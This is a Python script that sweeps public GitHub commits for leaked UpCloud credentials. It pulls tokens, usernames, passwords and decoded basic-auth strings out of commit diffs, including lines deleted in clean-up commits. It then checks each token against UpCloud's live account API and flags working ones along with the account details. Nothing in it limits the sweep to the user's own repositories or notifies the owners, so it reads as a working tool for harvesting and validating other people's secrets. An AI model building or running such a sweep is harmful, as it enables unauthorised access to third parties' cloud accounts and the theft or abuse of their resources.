#!/usr/bin/env python3
"""
uc_deep.py — end-to-end UpCloud credential sweep, evidence-gated.

Chain:
  1. api.github.com/search/commits   (unauth, 10/min) - messages that talk about
     upcloud keys/creds; removal commits keep the secret in the deleted hunk.
  2. github.com/<repo>/commit/<sha>.patch  (no API quota) - full diff.
  3. extract ucat_* tokens + username:password pairs + basic-auth blobs.
  4. validate every token-shaped candidate against api.upcloud.com/1.3/account.
     Only HTTP 200 counts as a hit. 401 => dead/revoked, reported as such.

Output: out/uc_deep_report.json  (tokens, candidates, validation, dead list)
"""
import json, os, re, sys, time, base64, urllib.parse, urllib.request, urllib.error

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
QUERIES = [
    "upcloud key", "upcloud credentials", "upcloud secret", "upcloud token leak",
    "remove upcloud key", "upcloud api key", "UPCLOUD_API_KEY", "UPCLOUD_TOKEN",
    "UPCLOUD_PASSWORD", "ucat_", "upcloud .env", "rotate upcloud",
]
TOKEN_RX = re.compile(r"\bucat_[A-Za-z0-9]{6,}")
PAIR_RX = re.compile(r"(?i)\b(UPCLOUD_USER(?:NAME)?|upcloud_user)\s*[=:]\s*[\"']?([A-Za-z0-9_.\-@]{3,})")
PW_RX = re.compile(r"(?i)\b(UPCLOUD_PASS(?:WORD)?|upcloud_password)\s*[=:]\s*[\"']?([^\s\"'#,]{6,})")
URL_RX = re.compile(r"(?i)https?://([A-Za-z0-9_.\-]{2,}):([^\s@/\"']{6,})@([A-Za-z0-9_.\-]*upcloud[A-Za-z0-9_.\-]*)")
B64_RX = re.compile(r"(?i)authorization[^\n]{0,20}basic\s+([A-Za-z0-9+/=]{16,})")
PLACE = re.compile(r"(?i)(your|xxx|test|fake|example|placeholder|changeme|dummy|here\b|"
                   r"deadbeef|DQE3AJDEBFEKECFM558TGH2F|yyyy|zzzz|unused|\$\{|<)")


def get(url, timeout=40, accept=None):
    h = {"User-Agent": UA}
    if accept:
        h["Accept"] = accept
    return urllib.request.urlopen(urllib.request.Request(url, headers=h), timeout=timeout).read()


def commits(q, pages=1):
    out = []
    for p in range(1, pages + 1):
        u = "https://api.github.com/search/commits?" + urllib.parse.urlencode(
            {"q": q, "per_page": 100, "page": p})
        try:
            d = json.loads(get(u, timeout=30, accept="application/vnd.github.cloak-preview+json"))
        except Exception as e:
            print(f"  [!] {q} p{p}: {e}", file=sys.stderr)
            return out
        for it in d.get("items", []):
            out.append({"query": q, "repo": it["repository"]["full_name"], "sha": it["sha"],
                        "msg": (it["commit"]["message"] or "").split("\n")[0][:140],
                        "date": it["commit"]["author"]["date"]})
        if len(d.get("items", [])) < 100:
            break
        time.sleep(6)
    return out


def patch(repo, sha):
    try:
        return get(f"https://github.com/{repo}/commit/{sha}.patch", timeout=40).decode("utf-8", "ignore")
    except Exception:
        return None


def validate(tok):
    req = urllib.request.Request("https://api.upcloud.com/1.3/account", headers={
        "Authorization": f"Bearer {tok}", "Accept": "application/json", "User-Agent": UA})
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read(3000).decode("utf-8", "ignore")
        j = json.loads(body)
        return {"token": tok, "status": r.status, "live": True,
                "account": j.get("account", {})}
    except urllib.error.HTTPError as e:
        return {"token": tok, "status": e.code, "live": False}
    except Exception as e:
        return {"token": tok, "status": None, "live": False, "error": str(e)}


def main():
    outdir = sys.argv[1] if len(sys.argv) > 1 else "uc_deep_out"
    os.makedirs(outdir, exist_ok=True)
    rep = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
           "commits": [], "hits": [], "tokens": {}, "pairs": [], "validation": []}

    seen = set()
    for q in QUERIES:
        cs = commits(q, pages=1)
        new = [c for c in cs if (c["repo"], c["sha"]) not in seen]
        for c in new:
            seen.add((c["repo"], c["sha"]))
        rep["commits"].extend(new)
        print(f"[commits] {q!r}: +{len(new)} (total {len(rep['commits'])})")
        time.sleep(6.5)

    hot = re.compile(r"(?i)(remov|delet|leak|accident|revoke|rotat|scrub|secret|credential|expos|fix)")
    order = sorted(rep["commits"], key=lambda c: 0 if hot.search(c["msg"]) else 1)

    for i, c in enumerate(order, 1):
        p = patch(c["repo"], c["sha"])
        if not p:
            continue
        for line in p.splitlines():
            if not line.startswith(("+", "-")) or line.startswith(("+++", "---")):
                continue
            for t in TOKEN_RX.findall(line):
                if PLACE.search(t):
                    rep["tokens"][t] = {"repo": c["repo"], "sha": c["sha"], "placeholder": True}
                else:
                    rep["tokens"].setdefault(t, {"repo": c["repo"], "sha": c["sha"],
                                                 "placeholder": False, "line": line[:200]})
            for m in URL_RX.finditer(line):
                rep["pairs"].append({"kind": "url_basic", "repo": c["repo"], "sha": c["sha"],
                                     "user": m.group(1), "secret": m.group(2), "host": m.group(3)})
            for m in PAIR_RX.finditer(line):
                rep["pairs"].append({"kind": "user", "repo": c["repo"], "sha": c["sha"],
                                     "user": m.group(2)})
            for m in PW_RX.finditer(line):
                rep["pairs"].append({"kind": "pass", "repo": c["repo"], "sha": c["sha"],
                                     "secret": m.group(2)[:60]})
            for m in B64_RX.finditer(line):
                try:
                    dec = base64.b64decode(m.group(1) + "=" * (-len(m.group(1)) % 4)).decode("utf-8", "ignore")
                except Exception:
                    dec = ""
                if ":" in dec:
                    rep["pairs"].append({"kind": "basic_b64", "repo": c["repo"], "sha": c["sha"],
                                         "decoded": dec[:80]})
        if i % 40 == 0:
            print(f"  ...{i}/{len(order)} patches, {len(rep['tokens'])} tokens")
        time.sleep(0.6)

    live = 0
    for t, meta in rep["tokens"].items():
        if meta.get("placeholder"):
            continue
        v = validate(t)
        v.update(repo=meta["repo"], sha=meta["sha"])
        rep["validation"].append(v)
        if v["live"]:
            live += 1
            print(f"  [!!] LIVE TOKEN {t} from {meta['repo']}")
        time.sleep(1.2)

    json.dump(rep, open(f"{outdir}/uc_deep_report.json", "w"), indent=1)
    print(f"\n[=] commits={len(rep['commits'])} tokens={len(rep['tokens'])} "
          f"non-placeholder={len(rep['validation'])} LIVE={live} pairs={len(rep['pairs'])}")
    for v in rep["validation"]:
        print(f"  {v['status']} {'LIVE' if v['live'] else 'dead'} {v['token']} <- {v['repo']}")


if __name__ == "__main__":
    main()
